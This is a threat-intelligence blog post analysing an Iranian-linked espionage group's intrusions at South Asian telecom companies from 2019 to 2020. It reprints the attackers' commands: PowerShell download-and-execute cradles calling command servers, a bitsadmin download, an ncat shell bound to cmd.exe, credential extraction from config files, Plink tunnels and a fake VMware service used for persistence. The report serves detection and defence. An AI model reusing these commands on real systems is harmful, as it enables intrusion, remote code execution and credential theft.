Sophisticated Espionage Group Turns Attention to Telecom Providers in South
Asia
symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia

The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as
recently as April 2020.
There are indications that at least one of the companies was ﬁrst targeted as early as April 2019.
Email appears to be the initial infection vector used by the group. Greenbug is using a mixture of off-the-shelf tools and livingoff-the-land techniques in these attacks. It appears the group is interested in gaining access to database servers; we see it
stealing credentials then testing connectivity to these servers using the stolen credentials.
Greenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the
destructive Shamoon group, which has carried out disk-wiping attacks against organizations in Saudi Arabia. The Shamoon
attacks have been extensively covered, but it was never clear how the attackers stole the credentials that allowed them to
introduce their destructive malware onto victim systems. Research by Symantec in 2017 found evidence that Greenbug was
on an organization’s network prior to a wiping attack that involved W32.Disttrack.B (Shamoon’s malware). This link was never
deﬁnitively established, but cooperation between the two groups is considered a possibility.
Much of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including
the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent
focus on collecting credentials and maintaining a persistent, low-proﬁle presence on victim networks.

Infection vector
Across multiple victim machines, a ﬁle named proposal_pakistan110.chm:error.html was executed via an internet browser.
We also see the same ﬁle being opened by archiver tools. While we were unable to retrieve the ﬁle for analysis, the same
technique has been leveraged by Greenbug in the past, as early as 2016. In these earlier attacks, emails were sent to targets
containing a link to a likely compromised site, which hosted an archive ﬁle. This archive contains a malicious CHM ﬁle
(compiled HTML Help ﬁle), which includes an ADS (alternative data steam) to hide its payload, which is installed when
executed. This ﬁle usually also contains a decoy PDF ﬁle containing an error message that says the ﬁle could not be opened
correctly.
We have also seen similarly named ﬁles used in other organizations in the past to drop Trojan.Ismdoor, Greenbug’s custom
malware.
Around the same time as we saw this ﬁle, a ﬁle called GRUNTStager.hta was also executed. Symantec believes the
attackers used the publically available Covenant post-exploitation framework in order to gain an initial foothold in their target
organizations.

Covenant is a publicly available hack tool that is described as “a .NET command and control framework that aims to highlight
the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and
control platform.” It is described as being for use by “red teams,” but is also open to being abused by malicious actors.

Case study: Six-month intrusion
Greenbug was present on the systems of one organization from October 2019 to April 2020. It appeared to be interested in
gaining access to the organization’s database server. The attackers were observed executing various PowerShell commands
on the victim system.
The ﬁrst activity was seen on October 11, 2019, when a malicious PowerShell command was executed to install a
CobaltStrike Beacon module to download the next stage payload.
We were able to extract two command and control (C&C) server addresses from the PowerShell command.
Initially, the attackers leveraged this access to execute PowerShell to determine the version of PowerShell installed via
$PSVersionTable. After this, we observed the attackers proceed to attempt to download a malicious ﬁle hosted on the same
previously mentioned C&C server.
PowerShell.exe -nop -w hidden -c $L=new-object net.webclient;$L.proxy=
[Net.WebRequest]::GetSystemWebProxy();$L.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX
$L.downloadstring('http://95[.]179.177.157:445/0Zu5WpWN');
This command was executed several times but it is unclear if the attackers were successful. Approximately an hour later, the
attackers were also observed attempting to perform a download to CSIDL_APPDATA\a8f4.exe via the bitsadmin utility
bitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\a8f4.exe
The BITS administration utility can be used to download or upload jobs to be executed. It is a legitimate tool that we
commonly see abused by malicious actors. The attackers used this tool to download additional malicious tools to the
compromised machine.
A short time later, the attackers executed several tools from CSIDL_SYSTEM86\[REDACTED] directory:

csidl_system_drive\
[REDACTED]

msf.exe

The attackers were then seen launching PowerShell and attempting to execute a PowerShell script called msf.ps1.
PowerShell.exe -ExecutionPolicy Bypass -File CSIDL_SYSTEM_DRIVE\[REDACTED]\msf.ps1
This command was executed several times and is likely used to install a Metasploit payload to retain access to the
compromised machine. That is the last activity seen on that day.
No further activity was observed until February 6, 2020, when a suspicious PowerShell command was executed. The
PowerShell command follows the execution of the w3wp.exe process – an application that is used to serve requests to a web
application. This may indicate that the attackers have used a webshell on the compromised machine.
The following is a copy of the PowerShell command executed by the attackers:

};remove-item $env:temp\$tempdir -recurse};Foreach ($_ in $connstrings.ConnectionStrings.add) { if
($_.connectionString -ne $NULL) { write-host ""$ﬁle.Fullname --- $_.connectionString""} } };
This command is used to search for ﬁles similar to web.conﬁg. For each ﬁle found, it extracts username and password
information where possible, decrypting it using the aspnet_regiis.exe utility. These credentials may be used to access
organizational resources such as SQL servers.
Further activity was seen on February 12 and February 14. On February 12, the attackers returned and executed a tool:
pls.exe. An hour later, the attackers bound cmd.exe to a listening port using netcat with the following command:
CSIDL_SYSTEM_DRIVE\[REDACTED]\infopagesbackup\ncat.exe [REDACTED] 8989 -e cmd.exe
The same command was issued again about 20 minutes later.
Two days later, at 7.29am local-time, the attackers returned and connected to the listening port, launching cmd.exe.
They issued the following commands:

Command

Description

CSIDL_SYSTEM\cmd.exe" /c net user"

List all available local user accounts and information

PowerShell -c Get-PSDrive -PSProvider
\" FileSystem\"""""""

List all available drives on the ﬁlesystem and related information
(e.g. available space, location etc.)

The next day (February 15) the attackers returned to the command prompt and issued a command to add a user and then
checked that the user was added. No further activity was observed until March 4, when a PowerShell command was
launched at 6.30pm local time. A WMI command was also observed being executed and used to search for a speciﬁc
account. Shortly after this, the well-known credential-stealing tool Mimikatz was executed from
%USERPROFILE%\documents\x64.
On March 11, the attackers attempted to connect to a database server via PowerShell, presumably using credentials they
had stolen. The attackers also used an SQL command to retrieve the version information of the database server, presumably
to test the credentials and connectivity.
PowerShell -C
$conn=new-object System.Data.SqlClient.SQLConnection(" ""Data
Source=[REDACTED];User [REDACTED] { $conn.Open(); }Catch { continue;
}$cmd = new-object System.Data.SqlClient.SqlCommand(" ""select
@@version;" "", $conn);$ds=New-Object
system.Data.DataSet;$da=New-Object
system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.ﬁll($ds);$ds.Tables[0];$conn.Close();""
Further activity was seen in April. On April 8, suspicious PowerShell commands were observed attempting to download tools
from a remote host.
PowerShell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=
[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX
$k.downloadstring('http://185.205.210.46:1003/iO0RBYy3O');
PowerShell.exe -nop -w hidden -c $m=new-object net.webclient;$m.proxy=

$m.downloadstring('http://185.205.210.46:1131/t8daWgy9j13');

That was the only activity seen on April 8, then on April 13 PowerShell was launched and the following commands were
observed being executed:

Command

Description

PowerShell.exe" -noninteractive -executionpolicy by‐
pass whoami"

Check the account name of the current user executing
the command

PowerShell.exe" -noninteractive -executionpolicy by‐
pass netstat -a"

Network routing information

Next, PowerShell was used to connect to a database server and check the version information, likely to conﬁrm working
credentials. This is similar to the previous PowerShell command observed with the exception of a different database server IP
address.
Finally, the attackers used PowerShell to view the current ARP table (IPs and hostname of machines that have recently been
communicated with) via an arp -a command. That is the last activity we observed on this machine.
A number of suspicious ﬁles were found on this machine (see IoCs). The ﬁles include the Covenant tool and Mimikatz, as
already mentioned, as well as Cobalt Strike, an off-the-shelf tool that can be used to load shellcode onto victim machines,
and multiple webshells.

Other machines on the same network
We saw suspicious activity on various machines on this same victim’s network. The attackers targeted several other users
within the organization with the same ﬁle, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in
one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine,
alongside additional tools downloaded to the %APPDATA% directory from the attacker’s infrastructure.

Tunnels back to attackers
On one machine in this organization, we saw some suspicious PowerShell commands executed on December 9. One of the
ﬁles executed by PowerShell, comms.exe, is Plink. A second similar command used the Bitvise command line tunneling
client. Both tools are used to set up a tunnel to attacker-controlled infrastructure to allow Terminal Services and RDP access
to an internal machine.
"CSIDL_COMMON_APPDATA\comms\comms.exe" apps.vvvnews.com -P <?,?> -l <?,?> -pw <?,?> -proxytype
http_basic –proxyip [REDACTED] -proxyport 8080 -proxyuser [REDACTED].haq -proxypass [REDACTED] -C R [REDACTED]:4015:[REDACTED]:1540

[REDACTED] 3389 -proxy=y -proxyType=HTTP -proxyServer=[REDACTED] -proxyPort=8080 -proxyUsername=
[REDACTED]\[REDACTED].haq -proxyPassword=<?,?>
Tools such as Plink and Bitvise are legitimate sysadmin tools, but have been seen being exploited by malicious actors before,
including by Iranian actors earlier this year.
Plink was also seen on a second machine in this organization, which appears to have been compromised from November
2019 up to April 2020. The ﬁrst suspicious activity on this machine was seen on November 13, when PowerShell Remoting
was enabled on the machine to allow it to receive PowerShell commands.

A PowerShell command was used to download a ﬁle from attacker controlled infrastructure and launch it with a speciﬁc
argument.
(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yft.dat',
'C:\Programdata\VMware\Vmware.exe');
start-process C:\Programdata\VMware\Vmware.exe -arg 'L3NlcnZlcj12c2llZ3J1LmNvbSAvaWQ9NDE=';
The argument decodes to /server=vsiegru.com /id=41. Shortly after this the Plink utility was executed to establish a
connection to the victim network. A second PowerShell command was then executed as follows:
Del -force C:\Programdata\Vmware\Vmware.exe;
(New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yf.dat', 'C:\Programdata\Nt.dat');
move C:\Programdata\Nt.dat C:\Programdata\Vmware\VMware.exe -force;
cmd.exe /c sc create "VMwareUpdate" binpath= "C:\Programdata\Vmware\VMware.exe
L3NlcnZlcj1rb3BpbGthb3J1a292LmNvbSAvaWQ9NDkgL3Byb3h5PXllcyAvcHJveHl1cmw…[REDACTED]…
BUTUxcamF2ZWQubmFiaSAvcGFzc3dvcmQ9cHRtbEAyMjMz" displayname= "VMware Update Service" start= auto;
start-service VMwareUpdate;
Exit;
The encoded argument decodes to the following:
/server=kopilkaorukov.com /id=49 /proxy=yes /proxyurl=http://[REDACTED]:8080 /credential=yes /username=
[REDACTED]\[REDACTED] /password=[REDACTED]
The attackers were then seen adding a user to the administrators group on this machine. Two further PowerShell commands
were executed on the machine about a week later, on November 16.
The ﬁrst decodes to the following:
iex ((New-Object Net.WebClient).DownloadString('http://apps[.]vvvnews.com:8080/Default.htt'))
As the attackers have set up a tunnel, using the Plink tool, all connections appear to be routing to internal machine IP
addresses. This was likely done as a means to evade detection.

Activity targeting telecoms
Greenbug’s activity in this campaign seems to make it clear that its main focus with these victims is to steal credentials, and
to maintain a low proﬁle on the victim’s network so the attackers can remain on it for a substantial period of time. This is
typical of the activity we have seen in Greenbug victims in the past, with maintaining persistence on a victim network
appearing to be one of the group’s primary goals. Greenbug has also been observed targeting telecoms companies in this
same region in previous attack campaigns.
The setting up of tunnels shows how important keeping a low-proﬁle is for this group. Its focus on stealing credentials, and on
establishing connections with database servers, shows that it is aiming to achieve a high level of access to a victim’s
network - access that if exploited could cause havoc on a compromised network very quickly. This level of access, if
leveraged by actors using disruptive malware or ransomware, could shut down an organization’s entire network very quickly.
Previous victims of Greenbug have included organizations in the aviation, government, investment, and education sectors, as
well as the telecoms sector, with attacks against telecoms organizations in the Middle East in 2017. In 2019, we observed 18
nation-state backed groups targeting the telecoms sector worldwide, so it seems to be an area of interest for sophisticated
actors recently.
It is probably not too hard to understand why the telecommunications industry, made up of phone providers and internet
service providers (ISPs), is attractive to APT groups, whose main motivation is most often intelligence gathering. The access
to calls, communications logs, and messages offered by telecoms companies makes them hugely valuable targets for these
attackers.
We can only speculate about Greenbug’s motives for targeting these speciﬁc telecoms companies, but it is clear that
comprehensive and persistent access to victim networks remains the key priority for this group.
